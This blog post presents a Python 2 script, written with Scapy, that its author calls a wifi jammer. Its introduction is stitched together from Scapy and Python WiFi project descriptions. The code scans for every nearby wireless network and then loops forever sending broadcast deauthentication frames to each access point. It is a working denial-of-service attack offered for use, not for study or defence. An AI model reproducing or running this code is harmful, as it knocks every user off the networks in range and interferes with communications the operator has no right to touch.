---
layout: article
title:  Python automated wifi jammer
date: 2019-01-20 02:45:00+0200
coverPhoto: https://4.bp.blogspot.com/-VbC72mXvnDI/WO22xbcnzzI/AAAAAAAABEs/qhcZC1eZJFM1iepIVfeZgcH8dNleVOGhQCPcBGAYYCw/s1600/19b1a10c2a8ed261-3880217547.jpg.jpg
---

![]( https://4.bp.blogspot.com/-VbC72mXvnDI/WO22xbcnzzI/AAAAAAAABEs/qhcZC1eZJFM1iepIVfeZgcH8dNleVOGhQCPcBGAYYCw/s1600/19b1a10c2a8ed261-3880217547.jpg)

Each of these steps can be done in a different way depending on your platform and on the version of Scapy you want to use.

At the moment, there are two different versions of Scapy:

Scapy v2.x. The current up-to-date version. It consists of several files packaged in the standard distutils way. Scapy v2 <= 2.3.3 needs Python 2.5, Scapy v2 > 2.3.3 needs Python 2.7 or 3.4+.
Scapy v1.x (deprecated). It does not support Python 3. It consists of only one file and works on Python 2.4, so it might be easier to install. Moreover, your OS may already have specially prepared packages or ports for it. The last version is v1.2.2.

# Project description
Python WiFi is a Python module that provides read and write access to a wireless network card’s capabilities using the Linux Wireless Extensions. It was initially developed by Roman Joost with advice from Guido Goldstein of Infrae. It is currently maintained by Sean Robinson.

More information is available at http://pythonwifi.tuxfamily.org. A mailing list for announcements and developer discussion is available at pythonwifi@lists.tuxfamily.org.

Check the ./docs/feature_matrix_*.txt files for a detailed list of what is implemented. This may not work with 64-bit Linux kernels, I would appreciate reports of success or failure on such systems.

# Source code :

```python
	#!/usr/bin/python
	###################################################################
	#
	#                      Python Wifi Jammer
	#                        Youssef Boubli
	#
	###################################################################
	from scapy.all import *
	from wifi import Cell
	import time
	import wireless

	wifi1 = wireless.Wireless()
	interface = wifi1.interface()

	all_wifi = Cell.all(interface)
	#print "SSID\t BSSID\t Channel\t Power\t"
	print "[+] scannig for networks .."
	bssid = []
	time.sleep(2)
	for wi in all_wifi:
	 print "SSID is    : "  +    wi.ssid 
	 print "BSSID is   : "  +    wi.address
	 print "Channel is : "  +    str(wi.channel)
	 print "Quality is : "  +    str(wi.quality)
	 print "+" * 20
	 bssid.append(wi.address)
	 time.sleep(0.5)

	print "#" * 70

	def jam(address):
	 conf.iface = "mon1"
	 bssid = address   
	 client = "FF:FF:FF:FF:FF:FF" #
	 count = 3 
	 conf.verb = 0
	 packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	 for n in range(int(count)):
		sendp(packet)
	        print 'Deauth num '+ str(n)  +  ' sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
	while True:
	 for item in bssid: 
	  print "Jamming on : {0}".format(item)
	  jam(item)
```
